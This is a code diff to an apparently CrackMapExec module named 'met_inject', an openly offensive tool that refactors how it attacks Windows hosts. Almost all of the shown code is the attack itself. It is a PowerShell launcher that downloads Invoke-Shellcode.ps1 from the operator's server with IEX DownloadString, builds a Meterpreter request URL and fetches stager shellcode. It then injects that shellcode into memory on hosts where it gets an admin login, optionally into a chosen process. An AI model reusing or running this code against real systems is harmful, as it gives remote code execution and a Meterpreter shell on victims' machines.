@@ -1,4 +1,4 @@
-from cme.helpers import gen_random_string, create_ps_command, obfs_ps_script, get_ps_script
+from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script
 from sys import exit
 
 class CMEModule:
@@ -6,9 +6,11 @@ class CMEModule:
         Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
         Module by @byt3bl33d3r
     '''
-    name = 'metinject'
+    name = 'met_inject'
 
     description = "Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script"
+
+    chain_support = False
 
     def options(self, context, module_options):
         '''
@@ -35,13 +37,13 @@ class CMEModule:
 
         self.lhost = module_options['LHOST']
         self.lport = module_options['LPORT']
-        self.obfs_name = gen_random_string()
 
-    def on_admin_login(self, context, connection):
+    def launcher(self, context, command):
+
         #PowerSploit's 3.0 update removed the Meterpreter injection options in Invoke-Shellcode
         #so now we have to manually generate a valid Meterpreter request URL and download + exec the staged shellcode
 
-        payload = """
+        launcher = """
         IEX (New-Object Net.WebClient).DownloadString('{}://{}:{}/Invoke-Shellcode.ps1')
         $CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {{[Char]$_}}
         $SumTest = $False
@@ -54,30 +56,32 @@ class CMEModule:
         $Request = "{}://{}:{}/$($RequestUri)"
         $WebClient = New-Object System.Net.WebClient
         [Byte[]]$bytes = $WebClient.DownloadData($Request)
-        Invoke-{} -Force -Shellcode $bytes""".format(context.server,
+        Invoke-Shellcode -Force -Shellcode $bytes""".format(context.server,
                                                      context.localip,
                                                      context.server_port,
                                                      'http' if self.met_payload == 'reverse_http' else 'https',
                                                      self.lhost,
-                                                     self.lport,
-                                                     self.obfs_name)
+                                                     self.lport)
 
         if self.procid:
-            payload += " -ProcessID {}".format(self.procid)
+            launcher += " -ProcessID {}".format(self.procid)
 
-        context.log.debug('Payload:{}'.format(payload))
-        payload = create_ps_command(payload, force_ps32=True)
-        connection.execute(payload)
-        context.log.success('Executed payload')
+        return create_ps_command(launcher, force_ps32=True)
 
-    def on_request(self, context, request):
+    def payload(self, context, command):
+        with open(get_ps_script('PowerSploit/CodeExecution/Invoke-Shellcode.ps1'), 'r') as ps_script:
+            return obfs_ps_script(ps_script.read())
+
+    def on_admin_login(self, context, connection, launcher, payload):
+        connection.execute(launcher)
+        context.log.success('Executed launcher')
+
+    def on_request(self, context, request, launcher, payload):
         if 'Invoke-Shellcode.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('PowerSploit/CodeExecution/Invoke-Shellcode.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
-                request.wfile.write(ps_script)
+            request.wfile.write(payload)
 
             request.stop_tracking_host()
 
